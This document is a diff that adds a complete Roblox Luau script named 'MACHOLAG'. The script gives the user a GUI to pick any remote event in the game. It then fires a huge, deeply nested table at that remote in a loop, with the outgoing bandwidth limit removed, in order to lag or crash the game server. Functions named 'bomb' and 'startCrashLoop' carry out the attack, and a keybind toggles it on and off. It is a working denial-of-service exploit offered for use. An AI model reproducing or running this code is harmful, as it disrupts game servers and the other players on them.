@@ -1,0 +1,483 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local LAGGER_CONFIG = {
+    TableIncrease = 270,
+    Tries = 1,
+    LoopWaitTime = 0.05
+}
+
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+
+local statusLabel, mainFrame, toggleContainer, currentRemoteButton, remoteSelector, settingsFrame
+local laggerEnabled = false
+
+-- ====================== SCAN ALL REMOTES ======================
+local remotesList = {}
+
+local function scanRemotes()
+    remotesList = {}
+    
+    local function recurse(obj, currentPath)
+        for _, child in ipairs(obj:GetChildren()) do
+            local newPath = currentPath == "" and child.Name or currentPath .. "." .. child.Name
+            
+            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") or child:IsA("UnreliableRemoteEvent") then
+                table.insert(remotesList, {
+                    path = newPath,
+                    obj = child
+                })
+            end
+            
+            recurse(child, newPath)
+        end
+    end
+    
+    recurse(game, "")
+    
+    table.sort(remotesList, function(a, b)
+        return a.path < b.path
+    end)
+end
+
+scanRemotes()
+-- ============================================================
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MACHOLAGGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+for _,v in pairs(playerGui:GetChildren()) do
+    if v.Name == "MACHOLAGGui" and v ~= screenGui then v:Destroy() end
+end
+
+mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 260, 0, 240)   -- taller to fit the 3 new setting rows
+mainFrame.Position = UDim2.new(0.5, -130, 0.5, -110)
+mainFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
+mainFrame.BackgroundTransparency = 0.1
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
+
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Color = Color3.fromRGB(255, 0, 0)
+mainStroke.Thickness = 2
+mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, 32)
+titleBar.BackgroundTransparency = 1
+titleBar.Parent = mainFrame
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, -60, 1, 0)
+titleLabel.Position = UDim2.new(0, 10, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "MACHOLAG"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 11
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.Parent = titleBar
+
+local divider = Instance.new("Frame")
+divider.Size = UDim2.new(1, -16, 0, 1)
+divider.Position = UDim2.new(0, 8, 0, 32)
+divider.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+divider.BackgroundTransparency = 0.3
+divider.BorderSizePixel = 0
+divider.Parent = mainFrame
+
+toggleContainer = Instance.new("TextButton")
+toggleContainer.Size = UDim2.new(1, -16, 0, 36)
+toggleContainer.Position = UDim2.new(0, 8, 0, 38)
+toggleContainer.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+toggleContainer.BorderSizePixel = 0
+toggleContainer.AutoButtonColor = false
+toggleContainer.Text = ""
+toggleContainer.Parent = mainFrame
+Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(0, 10)
+
+local tcStr = Instance.new("UIStroke", toggleContainer)
+tcStr.Color = Color3.fromRGB(55, 0, 0); tcStr.Thickness = 1
+tcStr.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+local keybindButton = Instance.new("TextButton")
+keybindButton.Size = UDim2.new(0, 24, 0, 24)
+keybindButton.Position = UDim2.new(0, 6, 0.5, -12)
+keybindButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+keybindButton.BackgroundTransparency = 1
+keybindButton.Text = "?"
+keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+keybindButton.Font = Enum.Font.GothamBold
+keybindButton.TextSize = 8
+keybindButton.BorderSizePixel = 0
+keybindButton.ZIndex = 3
+keybindButton.Parent = toggleContainer
+Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(1, 0)
+
+local kbStr = Instance.new("UIStroke", keybindButton)
+kbStr.Color = Color3.fromRGB(255, 255, 255); kbStr.Thickness = 1
+kbStr.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(0.55, 0, 1, 0)
+statusLabel.Position = UDim2.new(0, 36, 0, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Lagger"
+statusLabel.TextColor3 = Color3.fromRGB(190, 190, 190)
+statusLabel.Font = Enum.Font.GothamBold
+statusLabel.TextSize = 10
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.ZIndex = 3
+statusLabel.Parent = toggleContainer
+
+-- ====================== CUSTOM REMOTE SELECTOR ======================
+local remoteLabel = Instance.new("TextLabel")
+remoteLabel.Size = UDim2.new(0, 55, 0, 26)
+remoteLabel.Position = UDim2.new(0, 8, 0, 82)
+remoteLabel.BackgroundTransparency = 1
+remoteLabel.Text = "Remote:"
+remoteLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+remoteLabel.Font = Enum.Font.Gotham
+remoteLabel.TextSize = 10
+remoteLabel.TextXAlignment = Enum.TextXAlignment.Left
+remoteLabel.Parent = mainFrame
+
+currentRemoteButton = Instance.new("TextButton")
+currentRemoteButton.Size = UDim2.new(1, -75, 0, 26)
+currentRemoteButton.Position = UDim2.new(0, 68, 0, 82)
+currentRemoteButton.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+currentRemoteButton.Text = CUSTOM_REMOTE_PATH
+currentRemoteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+currentRemoteButton.TextSize = 9
+currentRemoteButton.Font = Enum.Font.GothamBold
+currentRemoteButton.BorderSizePixel = 0
+currentRemoteButton.TextXAlignment = Enum.TextXAlignment.Left
+currentRemoteButton.TextTruncate = Enum.TextTruncate.AtEnd
+currentRemoteButton.Parent = mainFrame
+Instance.new("UICorner", currentRemoteButton).CornerRadius = UDim.new(0, 6)
+
+local crStr = Instance.new("UIStroke", currentRemoteButton)
+crStr.Color = Color3.fromRGB(65, 0, 0); crStr.Thickness = 1
+
+remoteSelector = Instance.new("Frame")
+remoteSelector.Name = "RemoteSelector"
+remoteSelector.Size = UDim2.new(1, -16, 0, 200)
+remoteSelector.Position = UDim2.new(0, 8, 0, 235)   -- below the new settings area
+remoteSelector.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+remoteSelector.BorderSizePixel = 0
+remoteSelector.Visible = false
+remoteSelector.Parent = mainFrame
+Instance.new("UICorner", remoteSelector).CornerRadius = UDim.new(0, 10)
+
+local rsStroke = Instance.new("UIStroke", remoteSelector)
+rsStroke.Color = Color3.fromRGB(55, 0, 0); rsStroke.Thickness = 1
+
+local selectorTitle = Instance.new("TextLabel")
+selectorTitle.Size = UDim2.new(1, 0, 0, 25)
+selectorTitle.BackgroundTransparency = 1
+selectorTitle.Text = "Select Remote"
+selectorTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+selectorTitle.Font = Enum.Font.GothamBold
+selectorTitle.TextSize = 12
+selectorTitle.Parent = remoteSelector
+
+local remoteScroll = Instance.new("ScrollingFrame")
+remoteScroll.Size = UDim2.new(1, -10, 1, -35)
+remoteScroll.Position = UDim2.new(0, 5, 0, 30)
+remoteScroll.BackgroundTransparency = 1
+remoteScroll.ScrollBarThickness = 4
+remoteScroll.Parent = remoteSelector
+
+local scrollLayout = Instance.new("UIListLayout", remoteScroll)
+scrollLayout.SortOrder = Enum.SortOrder.LayoutOrder
+scrollLayout.Padding = UDim.new(0, 2)
+
+scrollLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    remoteScroll.CanvasSize = UDim2.new(0, 0, 0, scrollLayout.AbsoluteContentSize.Y + 10)
+end)
+
+local function populateRemoteList()
+    for _, child in ipairs(remoteScroll:GetChildren()) do
+        if child:IsA("TextButton") then child:Destroy() end
+    end
+    
+    for i, remoteData in ipairs(remotesList) do
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, 0, 0, 25)
+        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        btn.Text = remoteData.path
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.TextSize = 10
+        btn.Font = Enum.Font.Gotham
+        btn.TextXAlignment = Enum.TextXAlignment.Left
+        btn.LayoutOrder = i
+        btn.Parent = remoteScroll
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
+        
+        btn.MouseButton1Click:Connect(function()
+            CUSTOM_REMOTE_PATH = remoteData.path
+            currentRemoteButton.Text = remoteData.path
+            remoteSelector.Visible = false
+            mainFrame:TweenSize(UDim2.new(0, 260, 0, 240), "Out", "Quad", 0.25, true)
+        end)
+    end
+end
+
+currentRemoteButton.MouseButton1Click:Connect(function()
+    if remoteSelector.Visible then
+        remoteSelector.Visible = false
+        mainFrame:TweenSize(UDim2.new(0, 260, 0, 240), "Out", "Quad", 0.25, true)
+    else
+        populateRemoteList()
+        remoteSelector.Visible = true
+        mainFrame:TweenSize(UDim2.new(0, 260, 0, 240 + 210), "Out", "Quad", 0.25, true)
+    end
+end)
+-- ============================================================
+
+-- ====================== 3 SETTINGS ROWS (nicely lined up) ======================
+settingsFrame = Instance.new("Frame")
+settingsFrame.Size = UDim2.new(1, -16, 0, 115)
+settingsFrame.Position = UDim2.new(0, 8, 0, 115)
+settingsFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+settingsFrame.BorderSizePixel = 0
+settingsFrame.Parent = mainFrame
+Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0, 10)
+
+local sfStroke = Instance.new("UIStroke", settingsFrame)
+sfStroke.Color = Color3.fromRGB(55, 0, 0); sfStroke.Thickness = 1
+
+local function createSettingRow(parent, yOffset, labelText, initialValue, step, isDecimal)
+    local row = Instance.new("Frame")
+    row.Size = UDim2.new(1, 0, 0, 32)
+    row.Position = UDim2.new(0, 0, 0, yOffset)
+    row.BackgroundTransparency = 1
+    row.Parent = parent
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(0.4, 0, 1, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = labelText
+    lbl.TextColor3 = Color3.fromRGB(200, 200, 200)
+    lbl.Font = Enum.Font.Gotham
+    lbl.TextSize = 11
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.Parent = row
+
+    local valueBox = Instance.new("TextBox")
+    valueBox.Size = UDim2.new(0, 70, 0, 26)
+    valueBox.Position = UDim2.new(0.42, 0, 0.5, -13)
+    valueBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    valueBox.Text = isDecimal and string.format("%.2f", initialValue) or tostring(initialValue)
+    valueBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    valueBox.TextSize = 11
+    valueBox.Font = Enum.Font.GothamBold
+    valueBox.BorderSizePixel = 0
+    valueBox.Parent = row
+    Instance.new("UICorner", valueBox).CornerRadius = UDim.new(0, 4)
+
+    local minusBtn = Instance.new("TextButton")
+    minusBtn.Size = UDim2.new(0, 26, 0, 26)
+    minusBtn.Position = UDim2.new(0.72, 0, 0.5, -13)
+    minusBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    minusBtn.Text = "-"
+    minusBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
+    minusBtn.Font = Enum.Font.GothamBold
+    minusBtn.TextSize = 16
+    minusBtn.Parent = row
+    Instance.new("UICorner", minusBtn).CornerRadius = UDim.new(0, 4)
+
+    local plusBtn = Instance.new("TextButton")
+    plusBtn.Size = UDim2.new(0, 26, 0, 26)
+    plusBtn.Position = UDim2.new(0.82, 0, 0.5, -13)
+    plusBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    plusBtn.Text = "+"
+    plusBtn.TextColor3 = Color3.fromRGB(80, 255, 80)
+    plusBtn.Font = Enum.Font.GothamBold
+    plusBtn.TextSize = 16
+    plusBtn.Parent = row
+    Instance.new("UICorner", plusBtn).CornerRadius = UDim.new(0, 4)
+
+    local currentVal = initialValue
+
+    local function updateValue(newVal)
+        currentVal = newVal
+        valueBox.Text = isDecimal and string.format("%.2f", currentVal) or tostring(math.floor(currentVal))
+        
+        if labelText == "Table Increase" then LAGGER_CONFIG.TableIncrease = currentVal
+        elseif labelText == "Tries" then LAGGER_CONFIG.Tries = currentVal
+        elseif labelText == "Loop Delay" then LAGGER_CONFIG.LoopWaitTime = currentVal
+        end
+    end
+
+    valueBox.FocusLost:Connect(function(enterPressed)
+        local num = tonumber(valueBox.Text)
+        if num then
+            if isDecimal then
+                num = math.clamp(num, 0.01, 2)
+            else
+                num = math.clamp(math.floor(num), 1, 500)
+            end
+            updateValue(num)
+        else
+            updateValue(currentVal)
+        end
+    end)
+
+    minusBtn.MouseButton1Click:Connect(function()
+        local newVal = currentVal - step
+        if isDecimal then newVal = math.max(0.01, newVal) else newVal = math.max(1, newVal) end
+        updateValue(newVal)
+    end)
+
+    plusBtn.MouseButton1Click:Connect(function()
+        local newVal = currentVal + step
+        if isDecimal then newVal = math.min(2, newVal) else newVal = math.min(500, newVal) end
+        updateValue(newVal)
+    end)
+end
+
+-- Create the 3 neatly lined up setting rows
+createSettingRow(settingsFrame, 8,  "Table Increase", LAGGER_CONFIG.TableIncrease, 10, false)
+createSettingRow(settingsFrame, 42, "Tries",          LAGGER_CONFIG.Tries,          1,  false)
+createSettingRow(settingsFrame, 76, "Loop Delay",     LAGGER_CONFIG.LoopWaitTime,   0.01, true)
+-- =====================================================================
+
+local function resolveRemote(path)
+    if not path or path == "" then return nil end
+    local obj = game
+    local cleaned = path:gsub("^game%.", "")
+    for segment in cleaned:gmatch("[^%.]+") do
+        if obj then
+            obj = obj[segment]
+        else
+            return nil
+        end
+    end
+    return obj
+end
+
+local function getmaxvalue(val)
+    local mainvalueifonetable = 499999
+    if type(val) ~= "number" then return nil end
+    return mainvalueifonetable/(val+2)
+end
+
+local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maximum = getmaxvalue(tableincrease) or 9999999
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 5000 == 0 then task.wait() end
+    end
+
+    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+    if remote then
+        for i = 1, tries do
+            pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+        end
+    end
+end
+
+local function startCrashLoop()
+    while laggerEnabled do
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+        task.spawn(function()
+            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
+        end)
+        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+    end
+end
+
+local function toggleLagger(state)
+    laggerEnabled = state
+    if laggerEnabled then
+        statusLabel.TextColor3 = Color3.fromRGB(255, 205, 205)
+        toggleContainer.BackgroundColor3 = Color3.fromRGB(115, 0, 0)
+        tcStr.Color = Color3.fromRGB(215, 50, 50)
+        task.spawn(startCrashLoop)
+    else
+        statusLabel.TextColor3 = Color3.fromRGB(190, 190, 190)
+        toggleContainer.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+        tcStr.Color = Color3.fromRGB(55, 0, 0)
+    end
+end
+
+toggleContainer.MouseButton1Click:Connect(function()
+    toggleLagger(not laggerEnabled)
+end)
+
+local listening = false
+local currentKeybind = nil
+
+keybindButton.MouseButton1Click:Connect(function()
+    listening = true
+    keybindButton.Text = "..."
+end)
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+
+    if input.KeyCode == Enum.KeyCode.LeftControl then
+        mainFrame.Visible = not mainFrame.Visible
+        return
+    end
+
+    if listening and input.UserInputType == Enum.UserInputType.Keyboard then
+        currentKeybind = input.KeyCode
+        keybindButton.Text = input.KeyCode.Name:sub(1,1)
+        listening = false
+    elseif currentKeybind and input.KeyCode == currentKeybind then
+        toggleLagger(not laggerEnabled)
+    end
+end)
+
+local closeButton = Instance.new("TextButton"); closeButton.Visible = false; closeButton.Parent = titleBar
+closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)
+
+local isMinimized = false
+local minimizeButton = Instance.new("TextButton"); minimizeButton.Visible = false; minimizeButton.Parent = titleBar
+minimizeButton.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    toggleContainer.Visible = not isMinimized
+    remoteLabel.Visible = not isMinimized
+    currentRemoteButton.Visible = not isMinimized
+    settingsFrame.Visible = not isMinimized
+    remoteSelector.Visible = false
+    
+    if isMinimized then
+        mainFrame:TweenSize(UDim2.new(0, 260, 0, 68), "Out", "Quad", 0.2, true)
+    else
+        mainFrame:TweenSize(UDim2.new(0, 260, 0, 240), "Out", "Quad", 0.2, true)
+    end
+end)
